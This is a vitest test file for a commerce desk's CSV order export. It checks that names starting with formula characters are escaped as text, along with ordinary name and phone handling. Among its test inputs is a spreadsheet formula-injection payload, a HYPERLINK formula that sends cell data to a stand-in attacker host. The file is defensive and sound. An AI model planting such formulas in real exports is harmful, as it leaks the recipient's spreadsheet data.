/**
 * The desk's CSV export: text the buyer typed (name, phone) must never run as a
 * spreadsheet formula, so a cell starting with = + - @ tab or CR is kept as text.
 */
import Papa from 'papaparse';
import { describe, expect, it, vi } from 'vitest';
import { normalizeRow } from '@/routes/commerce/orders/-shared/order-api';

// The sandbox's node_modules lacks the native file plugins save-blob imports.
vi.mock('@/lib/save-blob', () => ({ saveBlob: vi.fn() }));

import { ordersCsv } from './OrderBulkBar';

const row = (customer_name: string, customer_phone = '9000000001') =>
    normalizeRow({
        id: 'ord-1',
        order_number: 'SO-1001',
        channel: 'ONLINE',
        status: 'CONFIRMED',
        payment_status: 'PAID',
        payment_method: 'PREPAID',
        customer_name,
        customer_phone,
        currency: 'INR',
        total: '500.00',
        amount_paid: '500.00',
        created_at: '2026-11-10T10:00:00Z',
    });

const cells = (csv: string) => Papa.parse<Record<string, string>>(csv, { header: true }).data[0]!;

describe('ordersCsv', () => {
    it.each([
        ['=HYPERLINK("https://evil.example/?"&C2,"Open")'],
        ['+SUM(1,2)'],
        ['-2+3'],
        ['@SUM(A1)'],
        ['\t=1+1'],
        ['\r=1+1'],
    ])('keeps a customer name starting %j as text', (name) => {
        expect(cells(ordersCsv([row(name)])).customer).toBe(`'${name}`);
    });

    it('leaves ordinary text alone and keeps a +91 phone readable as text', () => {
        const out = cells(ordersCsv([row('Test Customer', '+919000000001')]));
        expect(out.customer).toBe('Test Customer');
        expect(out.phone).toBe("'+919000000001");
        expect(out.order_number).toBe('SO-1001');
        expect(out.total).toBe('500.00');
    });
});
